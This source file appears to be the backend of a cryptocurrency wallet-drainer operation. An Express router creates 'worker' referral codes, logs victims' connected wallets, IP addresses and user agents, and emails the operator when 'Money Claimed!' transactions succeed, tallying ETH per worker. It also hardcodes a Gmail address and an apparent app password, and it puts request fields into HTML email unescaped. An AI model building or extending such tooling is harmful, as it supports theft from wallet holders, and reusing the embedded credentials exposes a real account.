const express = require('express');
const router = express.Router();
const { pool } = require('../config/database');
const nodemailer = require('nodemailer');

// Email configuration for admin notifications
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.ADMIN_EMAIL || 'skillstakes01@gmail.com',
    pass: process.env.EMAIL_PASSWORD || 'pkzz lylb ggvg jfrr'
  }
});

// Send email notification to admin
async function sendAdminNotification(subject, message) {
  try {
    await transporter.sendMail({
      from: process.env.ADMIN_EMAIL || 'skillstakes01@gmail.com',
      to: process.env.ADMIN_EMAIL || 'skillstakes01@gmail.com',
      subject: `🚨 Worker Alert: ${subject}`,
      html: message
    });
  } catch (error) {
    console.error('Email notification failed:', error);
  }
}

// CREATE NEW WORKER
router.post('/create', async (req, res) => {
  try {
    const { workerCode, workerName, email } = req.body;

    if (!workerCode) {
      return res.status(400).json({ error: 'Worker code is required' });
    }

    // Check if worker code already exists
    const existing = await pool.query(
      'SELECT * FROM workers WHERE worker_code = $1',
      [workerCode]
    );

    if (existing.rows.length > 0) {
      return res.status(400).json({ error: 'Worker code already exists. Please choose a different name.' });
    }

    // Create worker
    const result = await pool.query(
      'INSERT INTO workers (worker_code, worker_name, email, status) VALUES ($1, $2, $3, $4) RETURNING *',
      [workerCode, workerName || workerCode, email, 'active']
    );

    const worker = result.rows[0];
    const referralLink = `${process.env.FRONTEND_URL || 'http://localhost:3000'}/?ref=${workerCode}`;

    res.json({
      success: true,
      worker,
      referralLink,
      message: 'Worker created successfully!'
    });
  } catch (error) {
    console.error('Create worker error:', error);
    res.status(500).json({ error: 'Failed to create worker' });
  }
});

// GET ALL WORKERS
router.get('/list', async (req, res) => {
  try {
    const workers = await pool.query(`
      SELECT 
        w.*,
        COUNT(DISTINCT CASE WHEN rt.action_type = 'VISIT' THEN rt.id END) as total_visits,
        COUNT(DISTINCT CASE WHEN rt.action_type = 'WALLET_CONNECTED' THEN rt.wallet_address END) as total_wallets,
        COUNT(DISTINCT CASE WHEN rt.action_type = 'TRANSACTION_SUCCESS' THEN rt.id END) as total_claims,
        COALESCE(SUM(CASE WHEN rt.action_type = 'TRANSACTION_SUCCESS' THEN rt.amount ELSE 0 END), 0) as total_amount
      FROM workers w
      LEFT JOIN referral_tracking rt ON w.worker_code = rt.worker_code
      GROUP BY w.id
      ORDER BY w.created_at DESC
    `);

    res.json({ success: true, workers: workers.rows });
  } catch (error) {
    console.error('Get workers error:', error);
    res.status(500).json({ error: 'Failed to fetch workers' });
  }
});

// GET WORKER STATS
router.get('/stats/:workerCode', async (req, res) => {
  try {
    const { workerCode } = req.params;

    const stats = await pool.query(`
      SELECT 
        action_type,
        COUNT(*) as count,
        COALESCE(SUM(amount), 0) as total_amount
      FROM referral_tracking
      WHERE worker_code = $1
      GROUP BY action_type
    `, [workerCode]);

    const recentActivity = await pool.query(`
      SELECT *
      FROM referral_tracking
      WHERE worker_code = $1
      ORDER BY created_at DESC
      LIMIT 50
    `, [workerCode]);

    res.json({
      success: true,
      stats: stats.rows,
      recentActivity: recentActivity.rows
    });
  } catch (error) {
    console.error('Get worker stats error:', error);
    res.status(500).json({ error: 'Failed to fetch worker stats' });
  }
});

// TRACK REFERRAL ACTION
router.post('/track', async (req, res) => {
  try {
    const { workerCode, actionType, walletAddress, amount, txHash, metadata } = req.body;

    if (!workerCode || !actionType) {
      return res.status(400).json({ error: 'Worker code and action type are required' });
    }

    // Get IP and user agent
    const ipAddress = req.ip || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];

    // Save tracking data
    const result = await pool.query(`
      INSERT INTO referral_tracking 
      (worker_code, action_type, wallet_address, amount, tx_hash, ip_address, user_agent, metadata)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      RETURNING *
    `, [workerCode, actionType, walletAddress, amount, txHash, ipAddress, userAgent, metadata]);

    const tracking = result.rows[0];

    // Send email notification for important actions
    if (['WALLET_CONNECTED', 'TRANSACTION_SUCCESS'].includes(actionType)) {
      const actionMessages = {
        'WALLET_CONNECTED': `🔗 <strong>Wallet Connected!</strong><br>Worker: ${workerCode}<br>Wallet: ${walletAddress}`,
        'TRANSACTION_SUCCESS': `💰 <strong>SUCCESS! Money Claimed!</strong><br>Worker: ${workerCode}<br>Wallet: ${walletAddress}<br>Amount: ${amount} ETH<br>TX: ${txHash}`
      };

      await sendAdminNotification(
        `${workerCode} - ${actionType}`,
        actionMessages[actionType]
      );
    }

    res.json({ success: true, tracking });
  } catch (error) {
    console.error('Track action error:', error);
    res.status(500).json({ error: 'Failed to track action' });
  }
});

module.exports = router;

